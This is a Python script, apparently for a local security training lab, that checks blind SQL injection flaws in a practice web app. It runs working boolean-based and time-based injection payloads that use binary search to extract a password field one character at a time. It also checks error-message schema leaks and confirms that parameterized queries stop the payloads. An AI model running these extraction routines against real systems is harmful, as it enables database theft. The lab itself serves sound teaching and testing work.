#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_blindlab.py — 「無回饋」盲注驗證
=============================================================================

 驗證特色（本專案最特別的一類）：
   B1 布林盲注   → **只有是非題，用二分搜尋逐字元推導機密**
   B2 時間盲注   → **完全沒有文字差異，只能靠回應時間**
   B3 錯誤洩漏   → 錯誤訊息洩漏資料庫結構
   B4 安全對照   → 參數化查詢讓注入完全失效

 這與「有回饋」的注入驗證不同：
   不是看「有沒有輸出資料」，而是**用一堆是是非題拼出資料**。

 用法：
   python verify_blindlab.py 8960
=============================================================================
"""

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8960
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path, timeout=30):
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


# ===== B1：布林 oracle =====
def b1_cond(payload):
    """回傳 True 表示條件成立（user exists）。"""
    st, b = get("/b1?username=" + urllib.parse.quote(payload, safe=""))
    return "This user exists" in b


# ===== B2：時間 oracle =====
def b2_probe(payload, timeout=30):
    t0 = time.time()
    try:
        with urllib.request.urlopen(
                BASE + "/b2?username=" + urllib.parse.quote(payload, safe=""),
                timeout=timeout) as r:
            r.read()
    except Exception:                                        # noqa: BLE001
        pass
    return time.time() - t0


def b2_cond(payload):
    """回傳 True 表示回應變慢（條件成立）。"""
    el = b2_probe(payload)
    return el > 0.6      # sleep(1) → 約 1 秒；正常 < 0.1 秒


def leak_via_boolean(max_len=40):
    """用布林盲注逐字元洩漏 password 欄位。"""
    out = ""
    for pos in range(1, max_len + 1):
        # ★ 用 LENGTH 判斷是否還有字元
        #   （unicode('') 在 SQLite 回傳 NULL，不能用 =0 判斷）
        if not b1_cond("admin' AND LENGTH(password)>=%d --" % pos):
            break
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            pl = "admin' AND unicode(substr(password,%d,1))>%d --" % (pos, mid)
            if b1_cond(pl):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print("    B1 pos %2d → %r  (%s)" % (pos, chr(lo), out), flush=True)
    return out


def leak_via_time(max_len=40):
    """用 time-based 盲注逐字元洩漏 password 欄位。"""
    out = ""
    for pos in range(1, max_len + 1):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            pl = ("admin' AND CASE WHEN (unicode(substr(password,%d,1))>%d) "
                  "THEN sleep(1) ELSE 0 END --" % (pos, mid))
            if b2_cond(pl):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo)
        if ord(ch) == 32:
            break
        out += ch
        print("    B2 pos %2d → %r  (%s)" % (pos, ch, out), flush=True)
        if len(out) >= max_len:
            break
    return out


def main():
    print("=" * 76)
    print(" BlindLab 驗證 — 「無回饋」情境的資訊洩漏")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    # ============ B1：布林盲注 ============
    t_true = b1_cond("admin' AND 1=1 --")
    t_false = b1_cond("admin' AND 1=2 --")
    print("\n[步驟 1] 確認布林 oracle：1=1 → %s；1=2 → %s" % (t_true, t_false))
    leaked_b1 = ""
    if t_true and not t_false:
        print("[步驟 2] 用二分搜尋逐字元洩漏 password：")
        leaked_b1 = leak_via_boolean()
    ev = [
        "oracle    : 1=1 → exists=%s；1=2 → exists=%s" % (t_true, t_false),
        "注入點    : username=admin' AND ... --",
        "★ 洩漏結果: %r" % leaked_b1,
        "預期漏洞  : 只有『存在/不存在』的是非題，卻能逐字元推導出機密",
        "根因      : 字串拼接 SQL（沒有參數化查詢）",
        "危害      : 即使沒有任何資料輸出，仍可完整洩漏資料庫內容",
        "驗證方式  : **用二分搜尋把是非題變成資料**（每個字元約 6 次請求）",
        "修補方向  : 參數化查詢（見 /safe）；錯誤訊息不外洩",
        "OWASP 對照: CWE-89（SQL 注入）",
    ]
    check("B1 SQL 布林盲注（唯一訊號是是非題）", "CWE-89",
          bool(leaked_b1) and leaked_b1.startswith("FLAG"), "\n".join(ev))

    # ============ B2：time-based 盲注 ============
    print("\n[步驟 3] 確認時間 oracle：")
    el_norm = b2_probe("admin' AND 1=2 --")
    el_sleep = b2_probe("admin' AND CASE WHEN (1=1) THEN sleep(1) ELSE 0 END --")
    print("    正常條件: %.2fs | sleep 條件: %.2fs" % (el_norm, el_sleep))
    leaked_b2 = ""
    if el_sleep - el_norm > 0.5:
        print("[步驟 4] 用時間差二分洩漏 password（每個字元約 6 秒）：")
        leaked_b2 = leak_via_time()
    ev = [
        "正常條件耗時: %.2fs" % el_norm,
        "sleep 條件耗時: %.2fs（差 %.2fs）" % (el_sleep, el_sleep - el_norm),
        "注入點    : username=admin' AND CASE WHEN (...) THEN sleep(1) ELSE 0 END --",
        "★ 洩漏結果: %r" % leaked_b2,
        "預期漏洞  : 回應**完全沒有文字差異**，唯一訊號是回應時間",
        "根因      : 字串拼接 SQL + 錯誤訊息被抑制（更難察覺）",
        "危害      : 連『是非題』都沒有，仍能靠時間差完整洩漏資料",
        "            ——這是**最難偵測**的注入類型（WAF/日誌幾乎看不出異常）",
        "驗證方式  : **測量回應時間差**，把時間當成是非題",
        "修補方向  : 參數化查詢；查詢逾時；異常時間監控（A09）",
        "OWASP 對照: CWE-89（SQL 注入）",
    ]
    check("B2 time-based 盲注（完全沒有文字差異）", "CWE-89",
          bool(leaked_b2) and leaked_b2.startswith("FLAG"), "\n".join(ev))

    # ============ B3：錯誤訊息洩漏 ============
    st3, b3 = get("/b3?username=" + urllib.parse.quote("x'", safe=""))
    has_error = "資料庫錯誤" in b3 or "no such" in b3.lower() or "syntax" in b3.lower()
    # 只取 <pre> 內的錯誤內容（排除 CSS）
    m_pre = re.search(r"<pre>(.*?)</pre>", b3, re.S)
    b3_evidence = (m_pre.group(1).strip()[:200] if m_pre
                   else re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b3)).strip()[:200])
    # 檢查是否洩漏表名/欄位名
    leaks_schema = ("users" in b3) and ("username" in b3)
    ev = [
        "請求      : GET /b3?username=x'",
        "回應      : %s" % b3_evidence,
        "洩漏結構  : 表名 users=%s，欄位 username=%s" % ("users" in b3, "username" in b3),
        "預期漏洞  : 資料庫錯誤原樣回傳 → 洩漏結構",
        "根因      : 未捕捉/包裝例外，直接把 DB 錯誤給使用者",
        "危害      : 攻擊者可據此構造精確的注入 payload",
        "驗證方式  : 檢查回應是否含資料庫內部資訊（表名/欄位/語法錯誤）",
        "修補方向  : 統一的錯誤頁面；詳細錯誤只寫入日誌",
        "OWASP 對照: CWE-209（錯誤訊息洩漏）",
    ]
    check("B3 錯誤訊息洩漏資料庫結構", "CWE-209",
          has_error and leaks_schema, "\n".join(ev))

    # ============ B4：安全對照 ============
    # 注入 payload 在參數化查詢下應完全無效
    safe_true = "This user exists" in get(
        "/safe?username=" + urllib.parse.quote("admin' AND 1=1 --", safe=""))[1]
    safe_false = "This user exists" in get(
        "/safe?username=" + urllib.parse.quote("admin' AND 1=2 --", safe=""))[1]
    # 兩個都應該 False（因為字串被當成完整使用者名稱）
    blocked = (not safe_true) and (not safe_false)
    # 正常查詢仍可用
    normal_ok = "This user exists" in get(
        "/safe?username=" + urllib.parse.quote("admin", safe=""))[1]
    ev = [
        "注入測試 1: /safe?username=admin' AND 1=1 -- → exists=%s" % safe_true,
        "注入測試 2: /safe?username=admin' AND 1=2 -- → exists=%s" % safe_false,
        "正常查詢  : /safe?username=admin → exists=%s" % normal_ok,
        "預期結果  : 兩個注入 payload 都**無效**（整個字串被當成使用者名稱）",
        "根因（正確）: 參數化查詢 `SELECT ... WHERE username=?`",
        "教學意義  : **同一支程式的邏輯，換成參數化查詢就完全無法注入**",
        "            這是最有效、最根本的 SQL 注入防護",
    ]
    check("B4 安全對照：參數化查詢完全阻擋", "防護驗證",
          blocked and normal_ok, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-42s %-14s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  「無回饋」盲注的驗證特色：")
    print("    B1 → **只有是非題**，用二分搜尋把是是非題變成資料")
    print("    B2 → **連是非題都沒有**，把回應時間當成是非題")
    print("    B3 → 錯誤訊息洩漏結構")
    print("    B4 → 參數化查詢讓上述全部失效")
    print()
    print("  為什麼這類漏洞特別危險？")
    print("    沒有資料輸出、沒有錯誤訊息 → WAF/日誌幾乎看不出異常")
    print("    但攻擊者仍能逐字元完整還原資料庫內容")
    print("=" * 76)

    with open("blindlab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 blindlab_result.json）")


if __name__ == "__main__":
    main()
